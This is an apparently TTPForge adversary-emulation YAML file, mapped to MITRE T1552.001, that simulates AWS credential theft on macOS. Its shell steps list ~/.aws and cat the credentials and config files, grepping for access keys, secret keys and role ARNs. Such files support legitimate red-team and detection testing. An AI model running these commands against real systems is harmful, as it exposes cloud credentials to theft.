---
api_version: 2.0
uuid: bea69c0c-a06b-4177-9f4c-6f53018073f2
name: AWS Credentials Extraction
authors:
- TTPForge
description: |
  Extract AWS credentials from ~/.aws/ directory
mitre:
  tactics:
  - TA0006 Credential Access
  techniques:
  - T1552 Unsecured Credentials
  subtechniques:
  - 'T1552.001 Unsecured Credentials: Credentials In Files'
requirements:
  platforms:
  - os: darwin
args:
- name: aws_dir
  description: Directory containing AWS configuration
  type: string
  default: ~/.aws
- name: output_file
  description: File to store extracted AWS credentials
  type: string
  default: /tmp/aws_creds.txt
steps:
- name: Check AWS Directory
  inline: test -d {{ .Args.aws_dir }} && echo 'AWS directory found' || echo 'AWS directory not found'
- name: List AWS Configuration Files
  inline: ls -la {{ .Args.aws_dir }} 2>/dev/null || echo 'AWS config not accessible'
- name: Read AWS Credentials File
  inline: cat {{ .Args.aws_dir }}/credentials 2>/dev/null | grep -E 'aws_access_key|aws_secret_key|\[default\]' || echo 'No
    credentials file'
- name: Read AWS Config File
  inline: cat {{ .Args.aws_dir }}/config 2>/dev/null | grep -E 'region|role_arn' | head -10 || echo 'No config file'
  cleanup:
    inline: rm -f {{ .Args.output_file }}
tests:
- name: dry_run_test
  dry_run: true
